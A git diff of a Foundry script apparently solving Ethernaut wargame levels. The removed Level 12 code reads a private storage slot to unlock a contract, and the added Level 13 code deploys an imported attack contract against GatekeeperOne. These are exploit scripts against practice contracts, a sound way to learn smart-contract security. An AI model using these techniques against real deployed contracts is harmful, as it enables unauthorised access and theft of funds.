@@ -3,24 +3,24 @@ pragma solidity ^0.8.0;
 
 import {Script, console2} from "forge-std/Script.sol";
 import {IEthernaut} from "../interfaces/IEthernaut.sol";
-import {Privacy} from "../src/Level12.sol";
+import {GatekeeperOne} from "../src/Level13.sol";
+import {Attack} from "../src/Level13Attack.sol";
 
-contract Level12 is Script {
+contract Level13 is Script {
     IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
     address caller = vm.addr(vm.envUint("PRIVATE_KEY"));
 
     function run() public {
-        Privacy instance = Privacy(vm.envAddress("LVL12_ADDR"));
-
+        GatekeeperOne instance = GatekeeperOne(vm.envAddress("LVL13_ADDR"));
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        bytes32 key = vm.load(address(instance), bytes32(uint256(5)));
-        instance.unlock(bytes16(key));
+        Attack attacker = new Attack();
+        attacker.atatatak{gas: 100000}(instance);
 
-        if (instance.locked()) {
+        if (instance.entrant() != caller) {
             console2.log("call failed");
         } else ethernaut.submitLevelInstance(address(instance));
     }
 }
 
-// forge script script/Level12.s.sol --broadcast --rpc-url sepolia
+// forge script script/Level13.s.sol --broadcast --rpc-url sepolia
